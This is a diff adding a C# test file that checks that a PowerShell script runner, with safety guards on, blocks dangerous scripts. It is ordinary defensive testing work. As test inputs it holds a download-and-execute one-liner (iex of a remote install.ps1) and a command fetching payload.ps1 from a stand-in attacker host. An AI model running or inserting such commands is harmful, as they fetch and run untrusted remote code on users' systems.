@@ -1,0 +1,82 @@
+using Phantom.Models;
+using Phantom.Services;
+
+namespace Phantom.Tests;
+
+public sealed class PowerShellRunnerTests
+{
+    [Fact]
+    public async Task ExecuteAsync_BlocksDynamicScriptExecution_WhenSafetyGuardsEnabled()
+    {
+        var settings = new AppSettings
+        {
+            EnforceScriptSafetyGuards = true
+        };
+
+        var paths = TestHelpers.CreateIsolatedPaths();
+        var console = new ConsoleStreamService();
+        var log = TestHelpers.CreateLogService(paths, () => settings);
+        var runner = new PowerShellRunner(console, log, paths, () => settings);
+
+        var result = await runner.ExecuteAsync(new PowerShellExecutionRequest
+        {
+            OperationId = "test.dynamic",
+            StepName = "apply",
+            Script = "iex ((New-Object Net.WebClient).DownloadString('https://example.com/install.ps1'))",
+            DryRun = false
+        }, CancellationToken.None);
+
+        Assert.False(result.Success);
+        Assert.Contains("Blocked dynamic script execution pattern", result.CombinedOutput, StringComparison.OrdinalIgnoreCase);
+    }
+
+    [Fact]
+    public async Task ExecuteAsync_BlocksUntrustedDownloadHost_WhenSafetyGuardsEnabled()
+    {
+        var settings = new AppSettings
+        {
+            EnforceScriptSafetyGuards = true
+        };
+
+        var paths = TestHelpers.CreateIsolatedPaths();
+        var console = new ConsoleStreamService();
+        var log = TestHelpers.CreateLogService(paths, () => settings);
+        var runner = new PowerShellRunner(console, log, paths, () => settings);
+
+        var result = await runner.ExecuteAsync(new PowerShellExecutionRequest
+        {
+            OperationId = "test.host",
+            StepName = "download",
+            Script = "Invoke-WebRequest -Uri 'https://evil.example.com/payload.ps1' -OutFile \"$env:TEMP\\payload.ps1\"",
+            DryRun = false
+        }, CancellationToken.None);
+
+        Assert.False(result.Success);
+        Assert.Contains("Blocked download host", result.CombinedOutput, StringComparison.OrdinalIgnoreCase);
+    }
+
+    [Fact]
+    public async Task ExecuteAsync_AllowsTrustedHost_WhenDryRun()
+    {
+        var settings = new AppSettings
+        {
+            EnforceScriptSafetyGuards = true
+        };
+
+        var paths = TestHelpers.CreateIsolatedPaths();
+        var console = new ConsoleStreamService();
+        var log = TestHelpers.CreateLogService(paths, () => settings);
+        var runner = new PowerShellRunner(console, log, paths, () => settings);
+
+        var result = await runner.ExecuteAsync(new PowerShellExecutionRequest
+        {
+            OperationId = "test.trusted",
+            StepName = "download",
+            Script = "Invoke-WebRequest -Uri 'https://aka.ms/getwinget' -OutFile \"$env:TEMP\\AppInstaller.msixbundle\"",
+            DryRun = true
+        }, CancellationToken.None);
+
+        Assert.True(result.Success);
+        Assert.Equal(0, result.ExitCode);
+    }
+}
